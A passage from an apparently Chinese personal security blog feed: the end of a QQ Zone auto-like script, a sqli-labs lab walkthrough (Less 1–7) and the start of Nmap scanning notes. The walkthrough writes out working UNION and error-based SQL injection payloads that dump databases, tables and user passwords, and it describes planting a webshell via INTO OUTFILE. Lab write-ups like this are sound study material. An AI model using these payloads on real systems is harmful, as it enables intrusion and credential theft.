<span class="keyword">in</span> range(number):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chrome.find_element_by_xpath(<span class="string">"//*[@id='host_home_feeds']/li["</span>+str(x+<span class="number">1</span>)+<span class="string">"]"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            view_to_element(locate(<span class="string">"//*[@id='ICFeedsTipMsg']"</span>))</span><br><span class="line">        click_like(x+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    initial()</span><br><span class="line">    start_to_like(<span class="number">100</span>)    </span><br><span class="line">    print(<span class="string">"click like complete"</span>)</span><br><span class="line">    time.sleep(<span class="number">30</span>)</span><br><span class="line">    <span class="comment"># chrome.quit()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>一时兴起的产物, 还不赖吧…</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><figure class="image-box">
                <img src="http://188.131.227.20:999/picture/%E5%A5%B3%E7%A5%9E1.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/%E5%A5%B3%E7%A5%9E2.png" alt title class>
                <p></p>
            </figure>
<p><strong>你看, 女神见了都说好</strong></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><ul>
<li>优点:<br>可以基本自动化的给女神的QQ空间点赞.<br><del>让她上来自己动.</del></li>
<li>缺点:<ol>
<li>需要你安装chrome浏览器和对应的驱动, 虽然也可以是其它浏览器, 但需要稍微修改一些代码, 不够通用.</li>
<li>因为qq空间的说说是4个或者8个一组加载的, 本脚本在这些地方是基于报错来下拉加载新的说说, 比较不稳定, 有时会卡顿比较多的时间, 需要人为下拉. </li>
<li>例如这个<br><img src="http://188.131.227.20:999/picture/%E7%94%9F%E6%97%A5.png" alt><br>这种说说, 会干扰脚本的定位, 需要手动删除一下下</li>
</ol>
</li>
</ul>
<p>其实缺点2和3是可以克服的, 但是我已经懒得改了, ojbk<br><strong>或者点击下方为我打赏, 鼓励我写出更优质的脚本吧(手动滑稽)</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqli-lab闯关记录]]></title>
      <url>/2019/07/11/sqli-lab%E9%97%AF%E5%85%B3/</url>
      <content type="html"><![CDATA[<h1 id="sqli-lab闯关"><a href="#sqli-lab闯关" class="headerlink" title="sqli-lab闯关"></a>sqli-lab闯关</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>sql注入</code>一直是我想学但是又感到无力的技术, 最主要的原因还是对于数据库的使用还比较陌生, 这两天突然发现有一个sql注入的靶场–<code>sqli-lab</code>, 所以就搭建在了本地玩玩.<br>除了手工注入外, 也有一些自动化注入工具. 推荐下<code>sqlmap</code>(需要python2.x环境), 有的时候还是蛮好用的, 有时间会记录下用法.</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>sqli-lab</code>的 GitHub 源代码: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>需要的环境 : <code>apache</code>,<code>mysql</code>. 在其它的教程中我还看到需要<code>tomcat</code>,<code>js</code>等, 不过我目前还没用到, 暂时先不考虑.</p>
<p>下载后放在web目录下, 但是首次通过浏览器访问时可能会链接数据库失败, 需要在<code>/sqli-labs/sql-connections/db-creds.inc</code>文件中设置<code>mysql</code>数据库的密码.<br>如果你是像我一样使用的<code>phpstudy</code>提供的web环境的话, 数据库的初始用户名和密码通常都是<code>root</code>.</p>
<p>修改后再用浏览器访问第一关, 如果看到下面的内容, 就说明已经搭建好了.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/sqli.png" alt title class>
                <p></p>
            </figure>

<h2 id="Mysql常用语法"><a href="#Mysql常用语法" class="headerlink" title="Mysql常用语法"></a>Mysql常用语法</h2><p>说实话, 真心觉得mysql的语法很难记, 不知道是不是因为这个语法本身就很难, 也可能是我平时实在太少能用到数据库了, 所以想在这里记录一些常用的语法.<br>数据库本质上就是一个二维的表格, 所以在阅读相关语法时, 不妨在心里想象着一个表格, 并考虑执行了相关操作后, 这张表格会发生怎样的变化或者告诉你怎样的信息.<br><strong>注意: mysql数据库语句对大小写不敏感.</strong></p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">效果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SELECT</td>
<td align="left">从数据库中提取数据</td>
</tr>
<tr>
<td align="left">UPDATE</td>
<td align="left">更新数据库中的数据</td>
</tr>
<tr>
<td align="left">DELETE</td>
<td align="left">从数据库中删除数据</td>
</tr>
<tr>
<td align="left">INSERT INTO</td>
<td align="left">向数据库中插入新数据</td>
</tr>
<tr>
<td align="left">CREATE DATABASE</td>
<td align="left">创建新数据库</td>
</tr>
<tr>
<td align="left">ALTER DATABASE</td>
<td align="left">修改数据库</td>
</tr>
<tr>
<td align="left">CREATE TABLE</td>
<td align="left">创建新表</td>
</tr>
<tr>
<td align="left">ALTER TABLE</td>
<td align="left">变更（改变）数据库表</td>
</tr>
<tr>
<td align="left">DROP TABLE</td>
<td align="left">删除表</td>
</tr>
<tr>
<td align="left">CREATE INDEX</td>
<td align="left">创建索引（搜索键）</td>
</tr>
<tr>
<td align="left">DROP INDEX</td>
<td align="left">删除索引</td>
</tr>
</tbody></table>
<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>对于数据库的操作, 最常见的就是<code>增,删,查,改</code>.<br>select就是对应着<code>查询</code>这个操作, 估计也是在sql注入中常用的, 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name; # 在table_name表中查询所有记录的所有元素</span><br><span class="line">select number from table_name; # 在table_name表中查询所有记录的name元素</span><br><span class="line">select number from table_name where user=&apos;yjn&apos; and password=&apos;f**k you&apos;; # 在table_name表中查询元素user为&apos;yjn且password为&apos;f**k you&apos;的记录的name元素</span><br></pre></td></tr></table></figure>

<p>其中第三条就是大多数登录界面的基本雏形.<br>但是select的作用并不光是查询可以概括, 因为使用select同样可以返回<code>数据库函数</code>的值, 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database(); # 可以显示当前使用的数据库的名称.</span><br></pre></td></tr></table></figure>

<p>所以select的作用也有些类似编程语言中的<code>return</code><br>除此之外, 还可以使用<code>limit</code>来指定从查询的结果集中返回多少条记录.<br><code>limit a,b</code> 代表从第a条记录开始(a &gt;= 0)返回b条语句.<br>所以select的用法总结起来就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select [数据库函数](字段1,字段2,...) from (table_name) [where 条件(s)];</span><br></pre></td></tr></table></figure>

<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name  (field1, field2,...fieldN)  VALUES  (valueA1,valueA2,...valueAN),(valueB1,valueB2,...valueBN),(valueC1,valueC2,...valueCN)......;</span><br></pre></td></tr></table></figure>

<p>这是指定了记录元素的插入多条(或者单条)记录的语法.<br>如果所有的元素都要添加数据的话, 可以省去field的部分, 也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name VALUES  (valueA1,valueA2,...valueAN),(valueB1,valueB2,...valueBN),(valueC1,valueC2,...valueCN)......;</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE from table_name [where Clause];</span><br></pre></td></tr></table></figure>

<p>删除table_name表中符合条件Clause的记录, 如果没有指定where, 那么就会删除该表中的所有记录.</p>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</span><br><span class="line">[WHERE Clause]</span><br></pre></td></tr></table></figure>

<h3 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h3><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">database()</td>
<td align="center">显示当前使用的数据库的名称</td>
</tr>
<tr>
<td align="center">now()</td>
<td align="center">显示当前时间</td>
</tr>
<tr>
<td align="center">version()</td>
<td align="center">显示mysql服务版本信息</td>
</tr>
<tr>
<td align="center">concat(str1,str2…)</td>
<td align="center">将参数中的字符串拼接, 返回str1str2…</td>
</tr>
<tr>
<td align="center">concat_ws(char,str1,str2…)</td>
<td align="center">基本同上, 返回str1charstr2char…</td>
</tr>
<tr>
<td align="center">length(str)</td>
<td align="center">返回字符串的长度</td>
</tr>
<tr>
<td align="center">user()</td>
<td align="center">返回用户名</td>
</tr>
<tr>
<td align="center">char()</td>
<td align="center">将十进制参数转为对应的ascII码</td>
</tr>
<tr>
<td align="center">未完待续</td>
<td align="center">随时更新</td>
</tr>
</tbody></table>
<h3 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h3><p>用于连接两个以上的select语句的结果组合到一个结果集合中, 多个select语句会删除重复的数据. 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select country from websites UNION select country from apps;</span><br><span class="line">+---------+</span><br><span class="line">| country |</span><br><span class="line">+---------+</span><br><span class="line">| CN      |</span><br><span class="line">| IND     | </span><br><span class="line">| USA     |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>

<h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><p>既然要刷题, 就得总结出套路来才有意义. 下面是我总结出的常用流程.<br>因为目前肯定不全, 所以我也会在这里随时随时保持更新.</p>
<ol>
<li><p>判断是否存在注入<br>如果题目中会显示报错信息那么通常可以注入, 例如, 最简单的情况是输入<code>&#39;</code>显示报错信息, 那么这里就可能存在注入.</p>
</li>
<li><p>判断注入类型</p>
<ul>
<li><p>变量的储存类型?<br>  因为mysql数据库保存的信息可能按数值或字符串保存, 比如1和’1’. 这会导致有很多区别. 比如如果是按数值存储, 那么<code>1-1</code>就等价于<code>0</code>,字符串储存就是<code>&#39;1-1&#39;</code>的这段文本.</p>
</li>
<li><p>变量的闭合方式?</p>
</li>
</ul>
</li>
<li><p>判断数据列数<br> 查询返回的数据集中, 数据的格式是固定的. 自己构造payload时有必要与原来的格式相同(也就是列数, 不然会报错, 无法查询).<br> 可以使用<code>order by [数字]</code>来逐个测试, 也可以直接<code>union select 1,2,3...</code>来测试. </p>
</li>
<li><p>构造payload爆库<br> 构造查询语句获取<strong>数据库名, 表名, 列名, 具体数据等</strong><br> 这里可能会需要用到<code>information_schema</code>和<code>performance_schema</code>这两个数据库和其它的一些函数.</p>
<blockquote>
<p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。<a href="https://blog.csdn.net/demonson/article/details/80388677" target="_blank" rel="noopener">详情</a></p>
</blockquote>
</li>
</ol>
<h2 id="sqli-labs-冲冲冲"><a href="#sqli-labs-冲冲冲" class="headerlink" title="sqli-labs 冲冲冲"></a>sqli-labs 冲冲冲</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1|GET|Error based|Single quotes|String"></a>Less-1|GET|Error based|Single quotes|String</h3><p>终于可以开冲了.<br>来到第一关, 提示是在url中使用参数id来查询数据, 这也符合题目的描述.<br>经测试:</p>
<ul>
<li><code>[URL]/?id=1,2,3,4....</code>(get)均可以查询出name和password. 每个合法的id都对应着数据库中的一条数据.</li>
<li><code>[URL]/?id=&#39;</code>会报错(Error based):<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>
<li><code>id=1-1</code>会查询出<code>id=1</code>的数据, 说明是字符串(string)类型的查询.</li>
<li><code>[URL]?id=2&#39;--+</code>不报错, 说明是单引号(single quotes)闭合变量.<br>以上信息其实题目中都有给出, 但考虑到实战中可没有这些提示, 所以学习在没有提示的情况下获取这些信息还是很有必要的.</li>
</ul>
<p>下面的内容才是重点, 当构造payload :<code>[URL]/?id=0&#39; UNION SELECT 1,2,3--+</code>,可以看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome Dhakkan</span><br><span class="line">Your login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>说明结果集的数据有3列, 而第2列和第3列会被网页拿来使用.<br>到这里能大概猜测出查询语句了<br><code>SELECT filed1,filed2,filed3 FROM table WHERE ID=&#39;id&#39; LIMIT 0,1</code> </p>
<p>然后爆出数据库的一切信息.</p>
<ul>
<li><p>当前使用的数据库和所有数据库<br>  <code>[URL]/?id=0&#39; UNION SELECT 1,database(),(select group_concat(schema_name) from information_schema.schemata)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:information_schema,challenges,mysql,performance_schema,security,test</span><br></pre></td></tr></table></figure>
</li>
<li><p>security数据库的表<br>  <code>[URL]/?id=0&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p>表中的列名<br>  <code>[URL]/?id=0&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着可以查询所有的用户名和密码<br>  <code>[URL]/?id=0&#39; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2|GET|Error based|Intiger based"></a>Less-2|GET|Error based|Intiger based</h3><p><code>[URL]/?id=2-1</code>正常显示, 说明是数值型.<br><code>[URL]/?id=0 union select 1,2,3</code>显示2和3, 说明和上一题只是字符串和数值的区别, 所以剩下的步骤和上题相同.<br>例如<code>[URL]/?id=0 union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-String"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="Less-3|GET|Error based|Single quotes with twist|String"></a>Less-3|GET|Error based|Single quotes with twist|String</h3><p>一开始还是先判断下是字符串还是数值.<br><code>[URL]/?id=1-1</code>,页面显示的是id=1时的数据, 说明是字符串类型.<br>尝试用上面的套路,<br><code>[URL]/?id=0&#39; union select 1,2,3--+</code>会发现报错了:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;union select 1,2,3-- &apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>

<p>这里提示我们, 原来在变量的前面还有个<code>(</code>, 这对括号将我们的id包裹了起来, 也就是构造的payload没有生效. 所以需要把这对括号先闭合.<br><code>[URL]/?id=0&#39;) union select 1,2,3--+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>OK, 剩下的步骤就按照第一题的流程就可以了.<br><code>[URL]/?id=0&#39;) union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+</code></p>
<h3 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less-4|GET|Error based|Double Quotes|String"></a>Less-4|GET|Error based|Double Quotes|String</h3><p>如果首先尝试<code>[URl]/?id=0&#39; union select 1,2,3 --+</code>, 会发现既没有报错, 也没有显示查询结果, 这样似乎有点奇怪. 这是因为这里不是使用的<code>&#39;</code>进行闭合的.</p>
<ul>
<li><code>[URl]/?id=&#39;--+</code> 不报错.</li>
<li><code>[URl]/?id=&quot; --+</code> 报错, 判断出双引号和括号<code>(&quot; &quot;)</code>闭合.</li>
</ul>
<p><code>[URL]/?id=0&quot;) union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</code> </p>
<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5|GET|Double Injection|Single Quotes|String"></a>Less-5|GET|Double Injection|Single Quotes|String</h3><p>这道题和前面的就不太一样了.<br>访问<code>[URL]/?id=1</code>后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">You are in...........</span><br></pre></td></tr></table></figure>

<p>查询的信息是不会显示出来的, 这样就没法使用 union 查询我们想要的.<br>但是还<strong>有报错信息</strong>, 只能让目标出现在报错信息中, 这里需要使用新的注入方式: <strong>报错注入</strong>.<br>报错注入常用的三种方法:</p>
<ol>
<li><p>通过floor报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<p> <strong>输出字符长度限制为64个字符</strong></p>
</li>
<li><p>通过updatexml报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,payload,1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br> 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效.</p>
</blockquote>
</li>
<li><p>通过ExtractValue报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br></pre></td></tr></table></figure>

<p> **输出字符有长度限制, 最长32位.</p>
</li>
</ol>
<p>这里我们使用floor报错.<br>解释下其中的一些语法:</p>
<table>
<thead>
<tr>
<th align="left">语法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">count(*)</td>
<td align="left">返回表中所有数据条数</td>
</tr>
<tr>
<td align="left">floor(a)</td>
<td align="left">返回小于等于a的最大的整数</td>
</tr>
<tr>
<td align="left">rand(seed)</td>
<td align="left">返回一个(0,1)的随机数, 参数为伪随机数种子</td>
</tr>
<tr>
<td align="left">()x</td>
<td align="left">将括号里的值取别名x</td>
</tr>
<tr>
<td align="left">group by</td>
<td align="left">根据给定数据列的每个成员对查询结果进行分组统计，得到一个分组汇总表</td>
</tr>
</tbody></table>
<p>注:<br>虽然rand(0)可以产生随机数, 但因为种子固定, 每次调用都会产生相同的序列, 那么在每条语句中<code>floor(rand(0)*2)</code>的值是确定的，为<code>011011…</code>.<br>floor报错的原理比较难, 不在此赘述, 可以参考<a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">这篇博客</a>.</p>
<p>用上面的payload尝试获取数据库<br><code>http://localhost/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>

<p>说明查询的结果超过了64个字符. 可以放弃group_concat函数而使用LIMIT一条一条的查询.<br><code>[URL]/?id=1&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Duplicate entry &apos;information_schema;1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>

<p>只要遍历limit后的第一个参数就能获取整个表的信息.<br>后面的只要不断修改我们的payload就可以了.</p>
<h3 id="Less-6-Double-Injection-Double-Quotes-String"><a href="#Less-6-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6|Double Injection|Double Quotes|String"></a>Less-6|Double Injection|Double Quotes|String</h3><p>和第五题只是单引号/双引号闭合的区别, 不再赘述.</p>
<h3 id="Less-7-Dump-into-outfile-String"><a href="#Less-7-Dump-into-outfile-String" class="headerlink" title="Less-7|Dump into outfile|String"></a>Less-7|Dump into outfile|String</h3><p><strong>这关实在是太棒了.</strong><br>令id=1, 显示如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>

<p>令id=1-1, 显示没有发生变化, 说明是字符型.<br>下面寻找闭合方式.<br><code>[URL]/?id=1</code>回显正常.<br><code>[URL]/?id=1&#39;--+</code>语法错误.<br><code>[URL]/?id=1&#39;)--+</code>语法错误.<br><code>[URL]/?id=1&#39;))--+</code>回显终于正常了.</p>
<p>这次我们发现, 查询结果既没有显示, 报错信息也都是固定的, 所以需要新的方法, 也就是提示我们的outfile.<br>在mysql中, 使用<code>select [payload] into outfile [路径]</code>可以写入文件. 这可真是太感人了, 我们又多了一种向目标主机中植入木马的方式.</p>
<p>但是….<br>构造payload:<code>[URL]/?id=1&#39; union select 1,&quot;一句话&quot;,3 into outfile &quot;C:\\phpStudy\\PHPTutorial\\MySQackup\\&quot; --+</code>后总是提示有语法错误(一句话木马我就不写出来了, 别让defender又把我文件删了…), 于是我在第一关中构造了同样的payload, 报错如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>

<p>有点难受, 可能是写入木马后defender检测到了, 于是限制了权限, 总之这里目前还有些问题, 但是思路就是写入木马后在连接. 如果对一句话木马有疑惑, 可以移步我之前关于一句话木马的文章.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">sqli-labs闯关指南 1—10</a></li>
<li><a href="https://blog.csdn.net/uuihoo/article/details/82107903" target="_blank" rel="noopener">mysql group by 用法解析(详细)</a></li>
<li><a href="https://blog.csdn.net/xiaoxiaohui520134/article/details/81811179" target="_blank" rel="noopener">mysql中count函数使用方法详解</a></li>
<li><a href="https://www.cnblogs.com/fps2tao/p/9041204.html" target="_blank" rel="noopener">MySQL中的RAND()函数使用详解</a></li>
<li><a href="https://www.cnblogs.com/chuanzhang053/p/9228633.html" target="_blank" rel="noopener">mysql中floor函数的作用是什么?</a></li>
<li><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540" target="_blank" rel="noopener">floor()报错注入</a></li>
<li><a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">mysql教程</a></li>
<li><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> mysql基本语法 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nmap 学习笔记]]></title>
      <url>/2019/07/10/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="Nmap主机扫描学习笔记"><a href="#Nmap主机扫描学习笔记" class="headerlink" title="Nmap主机扫描学习笔记"></a>Nmap主机扫描学习笔记</h1><p>测试环境: linux 3.x<br>Nmap版本: 7.01</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmap.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="扫描单个目标"><a href="#扫描单个目标" class="headerlink" title="扫描单个目标"></a>扫描单个目标</h2><p>扫描单个主机的语法格式为<code>nmap [目标]</code><br>实例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nmap localhost</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2019-07-10 16:32 CST</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000093s latency).</span><br><span class="line">rDNS record for 127.0.0.1: localhost.localdomain</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">999/tcp  open  garcon</span><br><span class="line">1022/tcp open  exp2</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>

<h2 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h2><h3 id="命令行中分别指定"><a href="#命令行中分别指定" class="headerlink" title="命令行中分别指定"></a>命令行中分别指定</h3><p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# nmap 192.168.1.1 192.168.1.101 192.168.1.105</span><br><span class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-05 19:07 CST</span><br><span class="line">Nmap scan report for localhost (192.168.1.1)</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT       STATE SERVICE</span><br><span class="line">80/tcp             open  http</span><br><span class="line">1900/tcp          open  upnp</span><br><span class="line">49152/tcp         open  